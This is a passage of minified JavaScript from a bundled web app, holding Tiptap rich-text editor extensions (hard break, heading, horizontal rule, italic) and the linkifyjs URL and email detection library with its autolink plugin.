`));return o.replaceSelectionWith(this.type.create({language:s},l)),o.selection.$from.parent.type!==this.type&&o.setSelection($.near(o.doc.resolve(Math.max(0,o.selection.from-2)))),o.setMeta("paste",!0),t.dispatch(o),!0}}})]}}),mz=Ot.create({name:"doc",topNode:!0,content:"block+"}),gz=Ot.create({name:"hardBreak",addOptions(){return{keepMarks:!0,HTMLAttributes:{}}},inline:!0,group:"inline",selectable:!1,linebreakReplacement:!0,parseHTML(){return[{tag:"br"}]},renderHTML({HTMLAttributes:t}){return["br",Me(this.options.HTMLAttributes,t)]},renderText(){return`
`},addCommands(){return{setHardBreak:()=>({commands:t,chain:e,state:n,editor:r})=>t.first([()=>t.exitCode(),()=>t.command(()=>{const{selection:i,storedMarks:s}=n;if(i.$from.parent.type.spec.isolating)return!1;const{keepMarks:o}=this.options,{splittableMarks:a}=r.extensionManager,l=s||i.$to.parentOffset&&i.$from.marks();return e().insertContent({type:this.name}).command(({tr:u,dispatch:c})=>{if(c&&l&&o){const d=l.filter(f=>a.includes(f.type.name));u.ensureMarks(d)}return!0}).run()})])}},addKeyboardShortcuts(){return{"Mod-Enter":()=>this.editor.commands.setHardBreak(),"Shift-Enter":()=>this.editor.commands.setHardBreak()}}}),yz=Ot.create({name:"heading",addOptions(){return{levels:[1,2,3,4,5,6],HTMLAttributes:{}}},content:"inline*",group:"block",defining:!0,addAttributes(){return{level:{default:1,rendered:!1}}},parseHTML(){return this.options.levels.map(t=>({tag:`h${t}`,attrs:{level:t}}))},renderHTML({node:t,HTMLAttributes:e}){return[`h${this.options.levels.includes(t.attrs.level)?t.attrs.level:this.options.levels[0]}`,Me(this.options.HTMLAttributes,e),0]},addCommands(){return{setHeading:t=>({commands:e})=>this.options.levels.includes(t.level)?e.setNode(this.name,t):!1,toggleHeading:t=>({commands:e})=>this.options.levels.includes(t.level)?e.toggleNode(this.name,"paragraph",t):!1}},addKeyboardShortcuts(){return this.options.levels.reduce((t,e)=>({...t,[`Mod-Alt-${e}`]:()=>this.editor.commands.toggleHeading({level:e})}),{})},addInputRules(){return this.options.levels.map(t=>dp({find:new RegExp(`^(#{${Math.min(...this.options.levels)},${t}})\\s$`),type:this.type,getAttributes:{level:t}}))}}),xz=Ot.create({name:"horizontalRule",addOptions(){return{HTMLAttributes:{}}},group:"block",parseHTML(){return[{tag:"hr"}]},renderHTML({HTMLAttributes:t}){return["hr",Me(this.options.HTMLAttributes,t)]},addCommands(){return{setHorizontalRule:()=>({chain:t,state:e})=>{if(!MV(e,e.schema.nodes[this.name]))return!1;const{selection:n}=e,{$to:r}=n,i=t();return IE(n)?i.insertContentAt(r.pos,{type:this.name}):i.insertContent({type:this.name}),i.command(({tr:s,dispatch:o})=>{var a;if(o){const{$to:l}=s.selection,u=l.end();if(l.nodeAfter)l.nodeAfter.isTextblock?s.setSelection($.create(s.doc,l.pos+1)):l.nodeAfter.isBlock?s.setSelection(V.create(s.doc,l.pos)):s.setSelection($.create(s.doc,l.pos));else{const c=(a=l.parent.type.contentMatch.defaultType)==null?void 0:a.create();c&&(s.insert(u,c),s.setSelection($.create(s.doc,u+1)))}s.scrollIntoView()}return!0}).run()}}},addInputRules(){return[TV({find:/^(?:---|-|___\s|\*\*\*\s)$/,type:this.type})]}}),vz=/(?:^|\s)(\*(?!\s+\*)((?:[^*]+))\*(?!\s+\*))$/,wz=/(?:^|\s)(\*(?!\s+\*)((?:[^*]+))\*(?!\s+\*))/g,Sz=/(?:^|\s)(_(?!\s+_)((?:[^_]+))_(?!\s+_))$/,kz=/(?:^|\s)(_(?!\s+_)((?:[^_]+))_(?!\s+_))/g,bz=Pi.create({name:"italic",addOptions(){return{HTMLAttributes:{}}},parseHTML(){return[{tag:"em"},{tag:"i",getAttrs:t=>t.style.fontStyle!=="normal"&&null},{style:"font-style=normal",clearMark:t=>t.type.name===this.name},{style:"font-style=italic"}]},renderHTML({HTMLAttributes:t}){return["em",Me(this.options.HTMLAttributes,t),0]},addCommands(){return{setItalic:()=>({commands:t})=>t.setMark(this.name),toggleItalic:()=>({commands:t})=>t.toggleMark(this.name),unsetItalic:()=>({commands:t})=>t.unsetMark(this.name)}},addKeyboardShortcuts(){return{"Mod-i":()=>this.editor.commands.toggleItalic(),"Mod-I":()=>this.editor.commands.toggleItalic()}},addInputRules(){return[Ns({find:vz,type:this.type}),Ns({find:Sz,type:this.type})]},addPasteRules(){return[Ei({find:wz,type:this.type}),Ei({find:kz,type:this.type})]}});const Cz="aaa1rp3bb0ott3vie4c1le2ogado5udhabi7c0ademy5centure6ountant0s9o1tor4d0s1ult4e0g1ro2tna4f0l1rica5g0akhan5ency5i0g1rbus3force5tel5kdn3l0ibaba4pay4lfinanz6state5y2sace3tom5m0azon4ericanexpress7family11x2fam3ica3sterdam8nalytics7droid5quan4z2o0l2partments8p0le4q0uarelle8r0ab1mco4chi3my2pa2t0e3s0da2ia2sociates9t0hleta5torney7u0ction5di0ble3o3spost5thor3o0s4w0s2x0a2z0ure5ba0by2idu3namex4d1k2r0celona5laycard4s5efoot5gains6seball5ketball8uhaus5yern5b0c1t1va3cg1n2d1e0ats2uty4er2rlin4st0buy5t2f1g1h0arti5i0ble3d1ke2ng0o3o1z2j1lack0friday9ockbuster8g1omberg7ue3m0s1w2n0pparibas9o0ats3ehringer8fa2m1nd2o0k0ing5sch2tik2on4t1utique6x2r0adesco6idgestone9oadway5ker3ther5ussels7s1t1uild0ers6siness6y1zz3v1w1y1z0h3ca0b1fe2l0l1vinklein9m0era3p2non3petown5ital0one8r0avan4ds2e0er0s4s2sa1e1h1ino4t0ering5holic7ba1n1re3c1d1enter4o1rn3f0a1d2g1h0anel2nel4rity4se2t2eap3intai5ristmas6ome4urch5i0priani6rcle4sco3tadel4i0c2y3k1l0aims4eaning6ick2nic1que6othing5ud3ub0med6m1n1o0ach3des3ffee4llege4ogne5m0mbank4unity6pany2re3uter5sec4ndos3struction8ulting7tact3ractors9oking4l1p2rsica5untry4pon0s4rses6pa2r0edit0card4union9icket5own3s1uise0s6u0isinella9v1w1x1y0mru3ou3z2dad1nce3ta1e1ing3sun4y2clk3ds2e0al0er2s3gree4livery5l1oitte5ta3mocrat6ntal2ist5si0gn4v2hl2iamonds6et2gital5rect0ory7scount3ver5h2y2j1k1m1np2o0cs1tor4g1mains5t1wnload7rive4tv2ubai3nlop4pont4rban5vag2r2z2earth3t2c0o2deka3u0cation8e1g1mail3erck5nergy4gineer0ing9terprises10pson4quipment8r0icsson6ni3s0q1tate5t1u0rovision8s2vents5xchange6pert3osed4ress5traspace10fage2il1rwinds6th3mily4n0s2rm0ers5shion4t3edex3edback6rrari3ero6i0delity5o2lm2nal1nce1ial7re0stone6mdale6sh0ing5t0ness6j1k1lickr3ghts4r2orist4wers5y2m1o0o0d1tball6rd1ex2sale4um3undation8x2r0ee1senius7l1ogans4ntier7tr2ujitsu5n0d2rniture7tbol5yi3ga0l0lery3o1up4me0s3p1rden4y2b0iz3d0n2e0a1nt0ing5orge5f1g0ee3h1i0ft0s3ves2ing5l0ass3e1obal2o4m0ail3bh2o1x2n1odaddy5ld0point6f2o0dyear5g0le4p1t1v2p1q1r0ainger5phics5tis4een3ipe3ocery4up4s1t1u0cci3ge2ide2tars5ru3w1y2hair2mburg5ngout5us3bo2dfc0bank7ealth0care8lp1sinki6re1mes5iphop4samitsu7tachi5v2k0t2m1n1ockey4ldings5iday5medepot5goods5s0ense7nda3rse3spital5t0ing5t0els3mail5use3w2r1sbc3t1u0ghes5yatt3undai7ibm2cbc2e1u2d1e0ee3fm2kano4l1m0amat4db2mo0bilien9n0c1dustries8finiti5o2g1k1stitute6urance4e4t0ernational10uit4vestments10o1piranga7q1r0ish4s0maili5t0anbul7t0au2v3jaguar4va3cb2e0ep2tzt3welry6io2ll2m0p2nj2o0bs1urg4t1y2p0morgan6rs3uegos4niper7kaufen5ddi3e0rryhotels6properties14fh2g1h1i0a1ds2m1ndle4tchen5wi3m1n1oeln3matsu5sher5p0mg2n2r0d1ed3uokgroup8w1y0oto4z2la0caixa5mborghini8er3nd0rover6xess5salle5t0ino3robe5w0yer5b1c1ds2ease3clerc5frak4gal2o2xus4gbt3i0dl2fe0insurance9style7ghting6ke2lly3mited4o2ncoln4k2ve1ing5k1lc1p2oan0s3cker3us3l1ndon4tte1o3ve3pl0financial11r1s1t0d0a3u0ndbeck6xe1ury5v1y2ma0drid4if1son4keup4n0agement7go3p1rket0ing3s4riott5shalls7ttel5ba2c0kinsey7d1e0d0ia3et2lbourne7me1orial6n0u2rckmsd7g1h1iami3crosoft7l1ni1t2t0subishi9k1l0b1s2m0a2n1o0bi0le4da2e1i1m1nash3ey2ster5rmon3tgage6scow4to0rcycles9v0ie4p1q1r1s0d2t0n1r2u0seum3ic4v1w1x1y1z2na0b1goya4me2vy3ba2c1e0c1t0bank4flix4work5ustar5w0s2xt0direct7us4f0l2g0o2hk2i0co2ke1on3nja3ssan1y5l1o0kia3rton4w0ruz3tv4p1r0a1w2tt2u1yc2z2obi1server7ffice5kinawa6layan0group9lo3m0ega4ne1g1l0ine5oo2pen3racle3nge4g0anic5igins6saka4tsuka4t2vh3pa0ge2nasonic7ris2s1tners4s1y3y2ccw3e0t2f0izer5g1h0armacy6d1ilips5one2to0graphy6s4ysio5ics1tet2ures6d1n0g1k2oneer5zza4k1l0ace2y0station9umbing5s3m1n0c2ohl2ker3litie5rn2st3r0axi3ess3ime3o0d0uctions8f1gressive8mo2perties3y5tection8u0dential9s1t1ub2w0c2y2qa1pon3uebec3st5racing4dio4e0ad1lestate6tor2y4cipes5d0stone5umbrella9hab3ise0n3t2liance6n0t0als5pair3ort3ublican8st0aurant8view0s5xroth6ich0ardli6oh3l1o1p2o0cks3deo3gers4om3s0vp3u0gby3hr2n2w0e2yukyu6sa0arland6fe0ty4kura4le1on3msclub4ung5ndvik0coromant12ofi4p1rl2s1ve2xo3b0i1s2c0b1haeffler7midt4olarships8ol3ule3warz5ience5ot3d1e0arch3t2cure1ity6ek2lect4ner3rvices6ven3w1x0y3fr2g1h0angrila6rp3ell3ia1ksha5oes2p0ping5uji3w3i0lk2na1gles5te3j1k0i0n2y0pe4l0ing4m0art3ile4n0cf3o0ccer3ial4ftbank4ware6hu2lar2utions7ng1y2y2pa0ce3ort2t3r0l2s1t0ada2ples4r1tebank4farm7c0group6ockholm6rage3e3ream4udio2y3yle4u0cks3pplies3y2ort5rf1gery5zuki5v1watch4iss4x1y0dney4stems6z2tab1ipei4lk2obao4rget4tamotors6r2too4x0i3c0i2d0k2eam2ch0nology8l1masek5nnis4va3f1g1h0d1eater2re6iaa2ckets5enda4ps2res2ol4j0maxx4x2k0maxx5l1m0all4n1o0day3kyo3ols3p1ray3shiba5tal3urs3wn2yota3s3r0ade1ing4ining5vel0ers0insurance16ust3v2t1ube2i1nes3shu4v0s2w1z2ua1bank3s2g1k1nicom3versity8o2ol2ps2s1y1z2va0cations7na1guard7c1e0gas3ntures6risign5mgensberater2ung14sicherung10t2g1i0ajes4deo3g1king4llas4n1p1rgin4sa1ion4va1o3laanderen9n1odka3lvo3te1ing3o2yage5u2wales2mart4ter4ng0gou5tch0es6eather0channel12bcam3er2site5d0ding5ibo2r3f1hoswho6ien2ki2lliamhill9n0dows4e1ners6me2olterskluwer11odside6rk0s2ld3w2s1tc1f3xbox3erox4ihuan4n2xx2yz3yachts4hoo3maxun5ndex5e1odobashi7ga2kohama6u0tube6t1un3za0ppos4ra3ero3ip2m1one3uerich6w2",Ez="121342632165322333335355455655552435435422463632574574330355524444661154543332344423364211133222221212112052232222232212222223222241112222224322321222",hp="numeric",pp="ascii",mp="alpha",Ro="asciinumeric",fo="alphanumeric",gp="domain",rT="emoji",Tz="scheme",Mz="slashscheme",vf="whitespace";function Nz(t,e){return t in e||(e[t]=[]),e[t]}function ri(t,e,n){e[hp]&&(e[Ro]=!0,e[fo]=!0),e[pp]&&(e[Ro]=!0,e[mp]=!0),e[Ro]&&(e[fo]=!0),e[mp]&&(e[fo]=!0),e[fo]&&(e[gp]=!0),e[rT]&&(e[gp]=!0);for(const r in e){const i=Nz(r,n);i.indexOf(t)<0&&i.push(t)}}function Az(t,e){const n={};for(const r in e)e[r].indexOf(t)>=0&&(n[r]=!0);return n}function pt(t=null){this.j={},this.jr=[],this.jd=null,this.t=t}pt.groups={};pt.prototype={accepts(){return!!this.t},go(t){const e=this,n=e.j[t];if(n)return n;for(let r=0;r<e.jr.length;r++){const i=e.jr[r][0],s=e.jr[r][1];if(s&&i.test(t))return s}return e.jd},has(t,e=!1){return e?t in this.j:!!this.go(t)},ta(t,e,n,r){for(let i=0;i<t.length;i++)this.tt(t[i],e,n,r)},tr(t,e,n,r){r=r||pt.groups;let i;return e&&e.j?i=e:(i=new pt(e),n&&r&&ri(e,n,r)),this.jr.push([t,i]),i},ts(t,e,n,r){let i=this;const s=t.length;if(!s)return i;for(let o=0;o<s-1;o++)i=i.tt(t[o]);return i.tt(t[s-1],e,n,r)},tt(t,e,n,r){r=r||pt.groups;const i=this;if(e&&e.j)return i.j[t]=e,e;const s=e;let o,a=i.go(t);if(a?(o=new pt,Object.assign(o.j,a.j),o.jr.push.apply(o.jr,a.jr),o.jd=a.jd,o.t=a.t):o=new pt,s){if(r)if(o.t&&typeof o.t=="string"){const l=Object.assign(Az(o.t,r),n);ri(s,l,r)}else n&&ri(s,n,r);o.t=s}return i.j[t]=o,o}};const K=(t,e,n,r,i)=>t.ta(e,n,r,i),ge=(t,e,n,r,i)=>t.tr(e,n,r,i),Qv=(t,e,n,r,i)=>t.ts(e,n,r,i),P=(t,e,n,r,i)=>t.tt(e,n,r,i),Rn="WORD",yp="UWORD",iT="ASCIINUMERICAL",sT="ALPHANUMERICAL",va="LOCALHOST",xp="TLD",vp="UTLD",Kl="SCHEME",Fi="SLASH_SCHEME",jg="NUM",wp="WS",Fg="NL",Oo="OPENBRACE",Do="CLOSEBRACE",_u="OPENBRACKET",$u="CLOSEBRACKET",Hu="OPENPAREN",Uu="CLOSEPAREN",Wu="OPENANGLEBRACKET",Ku="CLOSEANGLEBRACKET",qu="FULLWIDTHLEFTPAREN",Gu="FULLWIDTHRIGHTPAREN",Ju="LEFTCORNERBRACKET",Yu="RIGHTCORNERBRACKET",Qu="LEFTWHITECORNERBRACKET",Xu="RIGHTWHITECORNERBRACKET",Zu="FULLWIDTHLESSTHAN",ec="FULLWIDTHGREATERTHAN",tc="AMPERSAND",nc="APOSTROPHE",rc="ASTERISK",sr="AT",ic="BACKSLASH",sc="BACKTICK",oc="CARET",cr="COLON",Bg="COMMA",ac="DOLLAR",hn="DOT",lc="EQUALS",Vg="EXCLAMATION",jt="HYPHEN",Lo="PERCENT",uc="PIPE",cc="PLUS",dc="POUND",Io="QUERY",zg="QUOTE",oT="FULLWIDTHMIDDLEDOT",_g="SEMI",pn="SLASH",jo="TILDE",fc="UNDERSCORE",aT="EMOJI",hc="SYM";var lT=Object.freeze({__proto__:null,ALPHANUMERICAL:sT,AMPERSAND:tc,APOSTROPHE:nc,ASCIINUMERICAL:iT,ASTERISK:rc,AT:sr,BACKSLASH:ic,BACKTICK:sc,CARET:oc,CLOSEANGLEBRACKET:Ku,CLOSEBRACE:Do,CLOSEBRACKET:$u,CLOSEPAREN:Uu,COLON:cr,COMMA:Bg,DOLLAR:ac,DOT:hn,EMOJI:aT,EQUALS:lc,EXCLAMATION:Vg,FULLWIDTHGREATERTHAN:ec,FULLWIDTHLEFTPAREN:qu,FULLWIDTHLESSTHAN:Zu,FULLWIDTHMIDDLEDOT:oT,FULLWIDTHRIGHTPAREN:Gu,HYPHEN:jt,LEFTCORNERBRACKET:Ju,LEFTWHITECORNERBRACKET:Qu,LOCALHOST:va,NL:Fg,NUM:jg,OPENANGLEBRACKET:Wu,OPENBRACE:Oo,OPENBRACKET:_u,OPENPAREN:Hu,PERCENT:Lo,PIPE:uc,PLUS:cc,POUND:dc,QUERY:Io,QUOTE:zg,RIGHTCORNERBRACKET:Yu,RIGHTWHITECORNERBRACKET:Xu,SCHEME:Kl,SEMI:_g,SLASH:pn,SLASH_SCHEME:Fi,SYM:hc,TILDE:jo,TLD:xp,UNDERSCORE:fc,UTLD:vp,UWORD:yp,WORD:Rn,WS:wp});const An=/[a-z]/,no=new RegExp("\\p{L}","u"),wf=new RegExp("\\p{Emoji}","u"),Pn=/\d/,Sf=/\s/,Xv="\r",kf=`
`,Pz="",Rz="",bf="";let xl=null,vl=null;function Oz(t=[]){const e={};pt.groups=e;const n=new pt;xl==null&&(xl=Zv(Cz)),vl==null&&(vl=Zv(Ez)),P(n,"'",nc),P(n,"{",Oo),P(n,"}",Do),P(n,"[",_u),P(n,"]",$u),P(n,"(",Hu),P(n,")",Uu),P(n,"<",Wu),P(n,">",Ku),P(n,"",qu),P(n,"",Gu),P(n,"",Ju),P(n,"",Yu),P(n,"",Qu),P(n,"",Xu),P(n,"",Zu),P(n,"",ec),P(n,"&",tc),P(n,"*",rc),P(n,"@",sr),P(n,"`",sc),P(n,"^",oc),P(n,":",cr),P(n,",",Bg),P(n,"$",ac),P(n,".",hn),P(n,"=",lc),P(n,"!",Vg),P(n,"-",jt),P(n,"%",Lo),P(n,"|",uc),P(n,"+",cc),P(n,"#",dc),P(n,"?",Io),P(n,'"',zg),P(n,"/",pn),P(n,";",_g),P(n,"~",jo),P(n,"_",fc),P(n,"\\",ic),P(n,"",oT);const r=ge(n,Pn,jg,{[hp]:!0});ge(r,Pn,r);const i=ge(r,An,iT,{[Ro]:!0}),s=ge(r,no,sT,{[fo]:!0}),o=ge(n,An,Rn,{[pp]:!0});ge(o,Pn,i),ge(o,An,o),ge(i,Pn,i),ge(i,An,i);const a=ge(n,no,yp,{[mp]:!0});ge(a,An),ge(a,Pn,s),ge(a,no,a),ge(s,Pn,s),ge(s,An),ge(s,no,s);const l=P(n,kf,Fg,{[vf]:!0}),u=P(n,Xv,wp,{[vf]:!0}),c=ge(n,Sf,wp,{[vf]:!0});P(n,bf,c),P(u,kf,l),P(u,bf,c),ge(u,Sf,c),P(c,Xv),P(c,kf),ge(c,Sf,c),P(c,bf,c);const d=ge(n,wf,aT,{[rT]:!0});P(d,"#"),ge(d,wf,d),P(d,Pz,d);const f=P(d,Rz);P(f,"#"),ge(f,wf,d);const h=[[An,o],[Pn,i]],p=[[An,null],[no,a],[Pn,s]];for(let y=0;y<xl.length;y++)Xn(n,xl[y],xp,Rn,h);for(let y=0;y<vl.length;y++)Xn(n,vl[y],vp,yp,p);ri(xp,{tld:!0,ascii:!0},e),ri(vp,{utld:!0,alpha:!0},e),Xn(n,"file",Kl,Rn,h),Xn(n,"mailto",Kl,Rn,h),Xn(n,"http",Fi,Rn,h),Xn(n,"https",Fi,Rn,h),Xn(n,"ftp",Fi,Rn,h),Xn(n,"ftps",Fi,Rn,h),ri(Kl,{scheme:!0,ascii:!0},e),ri(Fi,{slashscheme:!0,ascii:!0},e),t=t.sort((y,x)=>y[0]>x[0]?1:-1);for(let y=0;y<t.length;y++){const x=t[y][0],v=t[y][1]?{[Tz]:!0}:{[Mz]:!0};x.indexOf("-")>=0?v[gp]=!0:An.test(x)?Pn.test(x)?v[Ro]=!0:v[pp]=!0:v[hp]=!0,Qv(n,x,x,v)}return Qv(n,"localhost",va,{ascii:!0}),n.jd=new pt(hc),{start:n,tokens:Object.assign({groups:e},lT)}}function uT(t,e){const n=Dz(e.replace(/[A-Z]/g,a=>a.toLowerCase())),r=n.length,i=[];let s=0,o=0;for(;o<r;){let a=t,l=null,u=0,c=null,d=-1,f=-1;for(;o<r&&(l=a.go(n[o]));)a=l,a.accepts()?(d=0,f=0,c=a):d>=0&&(d+=n[o].length,f++),u+=n[o].length,s+=n[o].length,o++;s-=d,o-=f,u-=d,i.push({t:c.t,v:e.slice(s-u,s),s:s-u,e:s})}return i}function Dz(t){const e=[],n=t.length;let r=0;for(;r<n;){let i=t.charCodeAt(r),s,o=i<55296||i>56319||r+1===n||(s=t.charCodeAt(r+1))<56320||s>57343?t[r]:t.slice(r,r+2);e.push(o),r+=o.length}return e}function Xn(t,e,n,r,i){let s;const o=e.length;for(let a=0;a<o-1;a++){const l=e[a];t.j[l]?s=t.j[l]:(s=new pt(r),s.jr=i.slice(),t.j[l]=s),t=s}return s=new pt(n),s.jr=i.slice(),t.j[e[o-1]]=s,s}function Zv(t){const e=[],n=[];let r=0,i="0123456789";for(;r<t.length;){let s=0;for(;i.indexOf(t[r+s])>=0;)s++;if(s>0){e.push(n.join(""));for(let o=parseInt(t.substring(r,r+s),10);o>0;o--)n.pop();r+=s}else n.push(t[r]),r++}return e}const wa={defaultProtocol:"http",events:null,format:e1,formatHref:e1,nl2br:!1,tagName:"a",target:null,rel:null,validate:!0,truncate:1/0,className:null,attributes:null,ignoreTags:[],render:null};function $g(t,e=null){let n=Object.assign({},wa);t&&(n=Object.assign(n,t instanceof $g?t.o:t));const r=n.ignoreTags,i=[];for(let s=0;s<r.length;s++)i.push(r[s].toUpperCase());this.o=n,e&&(this.defaultRender=e),this.ignoreTags=i}$g.prototype={o:wa,ignoreTags:[],defaultRender(t){return t},check(t){return this.get("validate",t.toString(),t)},get(t,e,n){const r=e!=null;let i=this.o[t];return i&&(typeof i=="object"?(i=n.t in i?i[n.t]:wa[t],typeof i=="function"&&r&&(i=i(e,n))):typeof i=="function"&&r&&(i=i(e,n.t,n)),i)},getObj(t,e,n){let r=this.o[t];return typeof r=="function"&&e!=null&&(r=r(e,n.t,n)),r},render(t){const e=t.render(this);return(this.get("render",null,t)||this.defaultRender)(e,t.t,t)}};function e1(t){return t}function cT(t,e){this.t="token",this.v=t,this.tk=e}cT.prototype={isLink:!1,toString(){return this.v},toHref(t){return this.toString()},toFormattedString(t){const e=this.toString(),n=t.get("truncate",e,this),r=t.get("format",e,this);return n&&r.length>n?r.substring(0,n)+"":r},toFormattedHref(t){return t.get("formatHref",this.toHref(t.get("defaultProtocol")),this)},startIndex(){return this.tk[0].s},endIndex(){return this.tk[this.tk.length-1].e},toObject(t=wa.defaultProtocol){return{type:this.t,value:this.toString(),isLink:this.isLink,href:this.toHref(t),start:this.startIndex(),end:this.endIndex()}},toFormattedObject(t){return{type:this.t,value:this.toFormattedString(t),isLink:this.isLink,href:this.toFormattedHref(t),start:this.startIndex(),end:this.endIndex()}},validate(t){return t.get("validate",this.toString(),this)},render(t){const e=this,n=this.toHref(t.get("defaultProtocol")),r=t.get("formatHref",n,this),i=t.get("tagName",n,e),s=this.toFormattedString(t),o={},a=t.get("className",n,e),l=t.get("target",n,e),u=t.get("rel",n,e),c=t.getObj("attributes",n,e),d=t.getObj("events",n,e);return o.href=r,a&&(o.class=a),l&&(o.target=l),u&&(o.rel=u),c&&Object.assign(o,c),{tagName:i,attributes:o,content:s,eventListeners:d}}};function sd(t,e){class n extends cT{constructor(i,s){super(i,s),this.t=t}}for(const r in e)n.prototype[r]=e[r];return n.t=t,n}const t1=sd("email",{isLink:!0,toHref(){return"mailto:"+this.toString()}}),n1=sd("text"),Lz=sd("nl"),wl=sd("url",{isLink:!0,toHref(t=wa.defaultProtocol){return this.hasProtocol()?this.v:`${t}://${this.v}`},hasProtocol(){const t=this.tk;return t.length>=2&&t[0].t!==va&&t[1].t===cr}}),Lt=t=>new pt(t);function Iz({groups:t}){const e=t.domain.concat([tc,rc,sr,ic,sc,oc,ac,lc,jt,jg,Lo,uc,cc,dc,pn,hc,jo,fc]),n=[nc,cr,Bg,hn,Vg,Lo,Io,zg,_g,Wu,Ku,Oo,Do,$u,_u,Hu,Uu,qu,Gu,Ju,Yu,Qu,Xu,Zu,ec],r=[tc,nc,rc,ic,sc,oc,ac,lc,jt,Oo,Do,Lo,uc,cc,dc,Io,pn,hc,jo,fc],i=Lt(),s=P(i,jo);K(s,r,s),K(s,t.domain,s);const o=Lt(),a=Lt(),l=Lt();K(i,t.domain,o),K(i,t.scheme,a),K(i,t.slashscheme,l),K(o,r,s),K(o,t.domain,o);const u=P(o,sr);P(s,sr,u),P(a,sr,u),P(l,sr,u);const c=P(s,hn);K(c,r,s),K(c,t.domain,s);const d=Lt();K(u,t.domain,d),K(d,t.domain,d);const f=P(d,hn);K(f,t.domain,d);const h=Lt(t1);K(f,t.tld,h),K(f,t.utld,h),P(u,va,h);const p=P(d,jt);P(p,jt,p),K(p,t.domain,d),K(h,t.domain,d),P(h,hn,f),P(h,jt,p);const y=P(h,cr);K(y,t.numeric,t1);const x=P(o,jt),g=P(o,hn);P(x,jt,x),K(x,t.domain,o),K(g,r,s),K(g,t.domain,o);const v=Lt(wl);K(g,t.tld,v),K(g,t.utld,v),K(v,t.domain,o),K(v,r,s),P(v,hn,g),P(v,jt,x),P(v,sr,u);const w=P(v,cr),b=Lt(wl);K(w,t.numeric,b);const k=Lt(wl),E=Lt();K(k,e,k),K(k,n,E),K(E,e,k),K(E,n,E),P(v,pn,k),P(b,pn,k);const M=P(a,cr),C=P(l,cr),N=P(C,pn),O=P(N,pn);K(a,t.domain,o),P(a,hn,g),P(a,jt,x),K(l,t.domain,o),P(l,hn,g),P(l,jt,x),K(M,t.domain,k),P(M,pn,k),P(M,Io,k),K(O,t.domain,k),K(O,e,k),P(O,pn,k);const H=[[Oo,Do],[_u,$u],[Hu,Uu],[Wu,Ku],[qu,Gu],[Ju,Yu],[Qu,Xu],[Zu,ec]];for(let pe=0;pe<H.length;pe++){const[Pe,bt]=H[pe],Ct=P(k,Pe);P(E,Pe,Ct),P(Ct,bt,k);const Re=Lt(wl);K(Ct,e,Re);const J=Lt();K(Ct,n),K(Re,e,Re),K(Re,n,J),K(J,e,Re),K(J,n,J),P(Re,bt,k),P(J,bt,k)}return P(i,va,v),P(i,Fg,Lz),{start:i,tokens:lT}}function jz(t,e,n){let r=n.length,i=0,s=[],o=[];for(;i<r;){let a=t,l=null,u=null,c=0,d=null,f=-1;for(;i<r&&!(l=a.go(n[i].t));)o.push(n[i++]);for(;i<r&&(u=l||a.go(n[i].t));)l=null,a=u,a.accepts()?(f=0,d=a):f>=0&&f++,i++,c++;if(f<0)i-=c,i<r&&(o.push(n[i]),i++);else{o.length>0&&(s.push(Cf(n1,e,o)),o=[]),i-=f,c-=f;const h=d.t,p=n.slice(i-c,i);s.push(Cf(h,e,p))}}return o.length>0&&s.push(Cf(n1,e,o)),s}function Cf(t,e,n){const r=n[0].s,i=n[n.length-1].e,s=e.slice(r,i);return new t(s,n)}const Fz=typeof console<"u"&&console&&console.warn||(()=>{}),Bz="until manual call of linkify.init(). Register all schemes and plugins before invoking linkify the first time.",re={scanner:null,parser:null,tokenQueue:[],pluginQueue:[],customSchemes:[],initialized:!1};function Vz(){return pt.groups={},re.scanner=null,re.parser=null,re.tokenQueue=[],re.pluginQueue=[],re.customSchemes=[],re.initialized=!1,re}function r1(t,e=!1){if(re.initialized&&Fz(`linkifyjs: already initialized - will not register custom scheme "${t}" ${Bz}`),!/^[0-9a-z]+(-[0-9a-z]+)*$/.test(t))throw new Error(`linkifyjs: incorrect scheme format.
1. Must only contain digits, lowercase ASCII letters or "-"
2. Cannot start or end with "-"
3. "-" cannot repeat`);re.customSchemes.push([t,e])}function zz(){re.scanner=Oz(re.customSchemes);for(let t=0;t<re.tokenQueue.length;t++)re.tokenQueue[t][1]({scanner:re.scanner});re.parser=Iz(re.scanner.tokens);for(let t=0;t<re.pluginQueue.length;t++)re.pluginQueue[t][1]({scanner:re.scanner,parser:re.parser});return re.initialized=!0,re}function Hg(t){return re.initialized||zz(),jz(re.parser.start,t,uT(re.scanner.start,t))}Hg.scan=uT;function dT(t,e=null,n=null){if(e&&typeof e=="object"){if(n)throw Error(`linkifyjs: Invalid link type ${e}; must be a string`);n=e,e=null}const r=new $g(n),i=Hg(t),s=[];for(let o=0;o<i.length;o++){const a=i[o];a.isLink&&(!e||a.t===e)&&r.check(a)&&s.push(a.toFormattedObject(r))}return s}var Ug="[\0- -\u2029]",_z=new RegExp(Ug),$z=new RegExp(`${Ug}$`),Hz=new RegExp(Ug,"g");function Uz(t){return t.length===1?t[0].isLink:t.length===3&&t[1].isLink?["()","[]"].includes(t[0].value+t[2].value):!1}function Wz(t){return new we({key:new ze("autolink"),appendTransaction:(e,n,r)=>{const i=e.some(u=>u.docChanged)&&!n.doc.eq(r.doc),s=e.some(u=>u.getMeta("preventAutolink"));if(!i||s)return;const{tr:o}=r,a=CE(n.doc,[...e]);if(DE(a).forEach(({newRange:u})=>{const c=$F(r.doc,u,h=>h.isTextblock);let d,f;if(c.length>1)d=c[0],f=r.doc.textBetween(d.pos,d.pos+d.node.nodeSize,void 0," ");else if(c.length){const h=r.doc.textBetween(u.from,u.to," "," ");if(!$z.test(h))return;d=c[0],f=r.doc.textBetween(d.pos,u.to,void 0," ")}if(d&&f){const h=f.split(_z).filter(Boolean);if(h.length<=0)return!1;const p=h[h.length-1],y=d.pos+f.lastIndexOf(p);if(!p)return!1;const x=Hg(p).map(g=>g.toObject(t.defaultProtocol));if(!Uz(x))return!1;x.filter(g=>g.isLink).map(g=>({...g,from:y+g.start+1,to:y+g.end+1})).filter(g=>r.schema.marks.code?!r.doc.rangeHasMark(g.from,g.to,r.schema.marks.code):!0).filter(g=>t.validate(g.value)).filter(g=>t.shouldAutoLink(g.value)).forEach(g=>{Dg(g.from,g.to,r.doc).some(v=>v.mark.type===t.type)||o.addMark(g.from,g.to,t.type.create({href:g.href}))})}}),!!o.steps.length)return o}})}function Kz(t){return new we({key:new ze("handleClickLink"),props:{handleClick:(e,n,r)=>{var i,s;if(r.button!==0||!e.editable)return!1;let o=null;if(r.target instanceof HTMLAnchorElement)o=r.target;else{let c=r.target;const d=[];for(;c.nodeName!=="DIV";)d.push(c),c=c.parentNode;o=d.find(f=>f.nodeName==="A")}if(!o)return!1;const 